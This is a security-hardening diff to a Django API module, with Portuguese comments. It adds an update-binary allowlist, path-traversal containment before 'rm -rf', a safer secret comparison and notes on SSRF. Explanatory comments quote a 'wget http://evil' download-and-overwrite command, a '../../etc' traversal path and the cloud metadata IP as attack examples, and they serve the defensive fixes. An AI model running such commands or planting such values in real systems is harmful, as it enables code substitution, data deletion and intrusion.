@@ -1,5 +1,6 @@
 import os
 import re
+import shlex
 import socket
 import hmac
 import logging
@@ -61,6 +62,30 @@ def _is_safe_path_segment(value):
 	"""Nome/segmento de caminho seguro: alfanumérico + . _ - e sem começar com '-'."""
 	return bool(value) and bool(re.fullmatch(r'[A-Za-z0-9._-]+', value)) and not value.startswith('-')
 
+# Onda 2 (#13, revisão adversarial): allowlist REAL do binário base de um update_command.
+# run_command(shell=False) faz shlex.split, o que neutraliza chaining/subshell — mas NÃO
+# restringe QUAL binário roda: 'wget http://evil -O /go/bin/httpx' (sem metacaractere)
+# ainda executaria. Restringimos argv[0] aos package managers usados pelos tools default
+# + auto-update do próprio binário do tool. Tools custom com outro updater entram aqui.
+ALLOWED_UPDATE_BINARIES = frozenset({'git', 'go', 'pip', 'pip3', 'nuclei', 'subfinder', 'chaos'})
+
+def _update_command_base(update_command):
+	"""basename de argv[0] do update_command (via shlex), ou '' se vazio/inparseável."""
+	try:
+		argv = shlex.split(update_command or '')
+	except ValueError:
+		return ''
+	return os.path.basename(argv[0]) if argv else ''
+
+def _is_contained_tool_path(clone_path):
+	"""True se clone_path (após realpath) é filho DIRETO de /usr/src/github, sem metacaracteres
+	nem traversal — evita que um github_clone_path adulterado ('/usr/src/github/../../etc')
+	vire deleção arbitrária de diretório no `rm -rf`."""
+	if not clone_path or _has_shell_meta(clone_path):
+		return False
+	real = os.path.realpath(clone_path)
+	return os.path.dirname(real) == '/usr/src/github' and bool(os.path.basename(real))
+
 # Bounded timeout for outbound HTTP issued on the synchronous web request path so a
 # slow/unresponsive upstream can't pin a gunicorn/web worker indefinitely (OWASP A04-2).
 WEB_FETCH_TIMEOUT = (10, 30)  # (connect, read) seconds
@@ -106,7 +131,9 @@ class SensorFindingsImport(APIView):
 		secret = getattr(settings, 'SURICATOOS_SENSOR_IMPORT_SECRET', '')
 		auth = request.META.get('HTTP_AUTHORIZATION', '')
 		# Onda 2 (#10): comparação em tempo constante — não vaza o segredo por timing.
-		if not secret or not hmac.compare_digest(auth, f'Bearer {secret}'):
+		# Compara em bytes (o header é atacante-controlado; um Authorization não-ASCII
+		# levantaria TypeError no compare_digest sobre str → 401 limpo em vez de 500).
+		if not secret or not hmac.compare_digest(auth.encode('utf-8', 'surrogateescape'), f'Bearer {secret}'.encode('utf-8')):
 			return Response({'error': 'unauthorized'}, status=401)
 		data = request.data or {}
 		tenant = (data.get('tenant') or '').strip()
@@ -666,8 +693,9 @@ class WafDetector(APIView):
 			response['message'] = _('Invalid Domain/URL provided!')
 			return Response(response)
 
-		# Onda 2 (#5 SSRF): -r/--noredirect — a decisão do guard sobre a origem é o único
-		# host que wafw00f contata; sem isso um 3xx do alvo levaria a 169.254.169.254/interno.
+		# Onda 2 (#5 SSRF): -r/--noredirect impede seguir 3xx do alvo p/ 169.254.169.254/interno.
+		# NB: não fecha o DNS-rebind entre o guard e a re-resolução do wafw00f — esse é o
+		# residual #12 (mitigação de infra: egress filtering + IMDSv2), ver security-onda2.md.
 		wafw00f_command = f'wafw00f -r {url}'
 		_unused, output = run_command(wafw00f_command, remove_ansi_sequence=True)
 		regex = r"behind (.*?) WAF"
@@ -1435,14 +1463,13 @@ class UninstallTool(APIView):
 				return Response({'status': False, 'message': _('Tool name is invalid; cannot uninstall.')})
 			uninstall_command = 'rm /go/bin/' + tool_name
 		elif 'git clone' in tool.install_command:
-			tool_name = tool.install_command[:-1] if tool.install_command[-1] == '/' else tool.install_command
-			tool_name = tool_name.split('/')[-1]
-			# Onda 2 (#13): github_clone_path vem do DB — exige caminho absoluto sob o
-			# diretório de tools e sem metacaracteres antes de passar ao rm.
-			clone_path = tool.github_clone_path or ''
-			if _has_shell_meta(clone_path) or not clone_path.startswith('/usr/src/github/'):
+			# Onda 2 (#13, revisão adversarial): github_clone_path vem do DB. startswith é
+			# driblável por traversal ('/usr/src/github/../../etc' → rm apaga fora do dir);
+			# exige que o realpath seja filho DIRETO de /usr/src/github e usa o caminho
+			# NORMALIZADO no rm.
+			if not _is_contained_tool_path(tool.github_clone_path):
 				return Response({'status': False, 'message': _('Tool path is invalid; cannot uninstall.')})
-			uninstall_command = 'rm -rf ' + clone_path
+			uninstall_command = 'rm -rf ' + os.path.realpath(tool.github_clone_path)
 		else:
 			return Response({'status': False, 'message': _('Cannot uninstall tool!')})
 
@@ -1486,6 +1513,13 @@ class UpdateTool(APIView):
 				return Response({'status': False, 'message': _('Tool path is invalid; cannot update the tool.')})
 			# `git -C <dir> pull` dispensa shell (sem 'cd &&'), então roda com shell=False.
 			update_command = f'git -C /usr/src/github/{tool_name} pull'
+
+		# Allowlist REAL do binário base (ver ALLOWED_UPDATE_BINARIES): shell=False só barra
+		# chaining, não impede rodar um binário arbitrário. Cobre git/go/pip/... e o
+		# auto-update do próprio tool (base == nome do tool).
+		base = _update_command_base(update_command)
+		if base not in ALLOWED_UPDATE_BINARIES and base != (tool.name or '').lower():
+			return Response({'status': False, 'message': _('Update command not allowed: base binary %(b)s is not in the allowlist.') % {'b': base or '?'}})
 
 		try:
 			run_command(update_command)
